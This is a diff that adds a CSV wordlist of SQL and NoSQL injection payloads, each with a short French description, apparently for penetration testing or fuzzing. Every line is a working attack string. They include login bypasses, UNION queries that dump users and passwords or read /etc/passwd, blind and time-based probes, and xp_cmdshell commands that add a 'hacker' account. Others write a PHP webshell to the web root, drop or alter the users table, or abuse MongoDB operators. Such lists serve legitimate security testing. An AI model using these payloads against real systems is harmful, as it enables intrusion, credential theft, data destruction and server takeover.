@@ -1,0 +1,45 @@
+payload,description
+' OR '1'='1,Auth bypass basique
+' OR '1'='1'--,Auth bypass avec commentaire
+' OR '1'='1'/*,Auth bypass commentaire C-style
+') OR ('1'='1,Auth bypass parenthèses
+admin'--,Login admin sans password
+admin'#,Login admin sans password (MySQL #)
+' OR 1=1--,Auth bypass numérique
+""" OR ""1""=""1",Auth bypass guillemets doubles
+1' OR '1' = '1']%00,Auth bypass null byte
+' UNION SELECT NULL--,UNION — détection nombre colonnes (1)
+"' UNION SELECT NULL,NULL--",UNION — 2 colonnes
+"' UNION SELECT NULL,NULL,NULL--",UNION — 3 colonnes
+"' UNION SELECT 1,2,3--",UNION — affichage colonnes
+"' UNION SELECT username,password,3 FROM users--",UNION — dump users/passwords
+"' UNION SELECT table_name,2,3 FROM information_schema.tables--",UNION — liste tables
+"' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",UNION — colonnes de table
+"' UNION SELECT 1,@@version,3--",UNION — version MySQL
+"' UNION SELECT 1,database(),3--",UNION — nom BDD courante
+"' UNION SELECT 1,user(),3--",UNION — utilisateur MySQL
+"' UNION SELECT 1,load_file('/etc/passwd'),3--",UNION — lire fichier (FILE priv)
+' AND 1=1--,Blind boolean — condition vraie
+' AND 1=2--,Blind boolean — condition fausse
+"' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",Blind — extraction char par char
+' AND (SELECT COUNT(*) FROM users)>0--,Blind — vérif table existe
+' AND LENGTH(database())>5--,Blind — longueur nom BDD
+'; WAITFOR DELAY '0:0:5'--,Time-based — MSSQL WAITFOR
+'; SELECT SLEEP(5)--,Time-based — MySQL SLEEP
+' OR SLEEP(5)--,Time-based — MySQL OR SLEEP
+1'; SELECT pg_sleep(5)--,Time-based — PostgreSQL pg_sleep
+"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",Time-based — Oracle DBMS_PIPE
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",Error-based — MySQL EXTRACTVALUE version
+"' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--",Error-based — MySQL UPDATEXML
+"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",Error-based — MSSQL CONVERT
+'; exec xp_cmdshell('whoami')--,OOB — MSSQL xp_cmdshell RCE
+'; exec xp_cmdshell('net user hacker hacker /add')--,OOB — MSSQL ajout utilisateur
+"' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/sh.php'--",OOB — MySQL écriture fichier
+' UNION SELECT '' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY '<?php system($_GET[cmd]); ?>'--,OOB — MySQL écriture webshell
+'; DROP TABLE users--,Stacked — DROP TABLE users
+"'; INSERT INTO users VALUES('hacker','hacker')--",Stacked — INSERT user
+'; UPDATE users SET password='hacked' WHERE username='admin'--,Stacked — UPDATE password admin
+"{""$gt"":""""}",NoSQL MongoDB — opérateur $gt bypass
+"{""$ne"":null}",NoSQL MongoDB — opérateur $ne null
+"{""$regex"":"".*""}",NoSQL MongoDB — regex wildcard
+"{""$where"":""sleep(5000)""}",NoSQL MongoDB — time-based
